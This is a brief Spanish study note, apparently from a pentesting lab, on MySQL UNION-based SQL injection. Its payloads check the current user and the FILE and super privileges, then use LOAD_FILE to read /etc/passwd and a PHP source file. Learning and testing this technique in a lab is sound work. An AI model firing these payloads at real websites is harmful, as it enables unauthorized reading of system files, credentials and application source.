
## Privilegios

Debemos tener el privielgio `FILE` para cargar contenido de un archivo en una tabla

1. Miramos nuestro usuario

- Primero forma:

```
' UNION SELECT 1, user(), 3, 4 -- -
```

- Segunda forma:

```
' UNION SELECT 1, user, 3, 4 FROM mysql.user -- -
```
![[Pasted image 20260713123323.png]]

2. Miramos privilegios de usuario

- Privs de superusuario: (Y --> privs de superusuario)

```
' UNION SELECT 1, super_priv FROM mysql.user WHERE user='USER' -- -
```
![[Pasted image 20260713123421.png]]

- Otros privs (Si tenemos FILE --> podemos leer)

```
' UNION SELECT 1, grantee, privilege_type, 4 FROM INFORMATION_SCHEMA.user_privileges WHERE grantee="'USER'@'localhost'" -- -
```

## LOAD_FILE

Se usa para ller archivos del sistema

```
' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4 -- -
```
![[Pasted image 20260713124023.png]]



Si leer archivos .php. Como vemos en este caso se renderiza por lo que si hacemos CTL U veremos incrustado el codigo PHP. En este caso lo haremos con lo que es el buscador

```
' UNION SELECT 1, LOAD_FILE('/var/www/html/search.php'), 3, 4-- -
```

![[Pasted image 20260713124106.png]]

Le damos a CTL+U
